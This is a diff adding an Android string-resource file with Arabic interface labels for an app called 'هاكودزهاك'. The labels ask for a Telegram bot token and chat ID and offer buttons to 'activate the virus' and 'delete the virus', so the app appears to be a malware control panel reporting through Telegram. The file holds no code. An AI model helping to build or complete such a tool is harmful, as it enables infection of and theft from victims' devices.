@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">هاكودزهاك</string>
+    <string name="login_title">هاكودزهاك\nالنهائي</string>
+    <string name="hint_token">توكن بوت التيليجرام</string>
+    <string name="hint_chat_id">آيدي التيليجرام</string>
+    <string name="btn_login">تسجيل الدخول</string>
+    <string name="dashboard_title">🔥 هاكودزهاك النهائي 🔥</string>
+    <string name="btn_start">تفعيل الفيروس</string>
+    <string name="btn_kill">حذف الفيروس</string>
+</resources>
